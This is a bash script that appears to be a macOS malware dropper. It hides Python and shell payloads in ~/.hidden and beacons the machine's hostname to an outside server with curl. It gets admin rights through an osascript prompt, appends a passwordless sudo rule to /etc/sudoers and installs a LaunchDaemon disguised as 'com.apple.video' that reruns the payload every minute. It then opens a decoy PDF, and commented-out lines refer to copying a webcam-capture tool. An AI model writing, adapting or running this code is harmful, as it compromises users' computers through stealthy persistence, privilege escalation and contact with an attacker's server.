#!/bin/bash


#Create the hidden directory ~/.textedit
mkdir $HOME/.hidden

#Copy the script to hidden folder

cp woffice.py $HOME/.hidden/woffice.py
cp woffice.sh $HOME/.hidden/woffice.sh
#cp setup.bash $HOME/.hidden/setup.bash

shost=$(hostname)


curl http://troglo.homepc.it/trade/alert.php?pc=mttool_${shost}
#Give the script permission to execute
chown root $HOME/.hidden/woffice.py
chmod +x $HOME/.hidden/woffice.py
chmod 777 $HOME/.hidden/woffice.sh
#chmod 777 $HOME/.hidden/setup.bash
chown root $HOME/.hidden/woffice.sh
#chmod u+s $HOME/.hidden/woffice.sh
#sh $HOME/.hidden/woffice.sh

osascript -e "do shell script \"$HOME/.hidden/woffice.sh $*\" with administrator privileges"
echo $USER' ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
#Create directory if it doesn't already exist.
mkdir $HOME/Library/LaunchAgents

#Write the .plist to LaunchAgents
echo '
<plist version="1.0">
    <dict>
    <key>RunAtLoad</key>  
    <true/>  
    <key>KeepAlive</key>  
    <true/>  
    <key>Label</key>
        <string>com.apple.video</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/python</string>
        <string>'$HOME'/.hidden/woffice.py</string>
    </array>

    <key>StartInterval</key>
        <integer>60</integer>
    <key>AbandonProcessGroup</key>
        <true/>
    </dict>
</plist>
' > /Library/LaunchDaemons/com.apple.video.plist
#' > /Library/LaunchAgents/com.apple.video.plist
chown root:wheel /Library/LaunchDaemons/com.apple.video.plist
chmod 0644 /Library/LaunchDaemons/com.apple.video.plist
#Load the LaunchAgent
launchctl load -w /Library/LaunchDaemons/com.apple.video.plist

#Copy imagesnap to the hidden directory
#cp imagesnap $HOME/.hidden

open file.pdf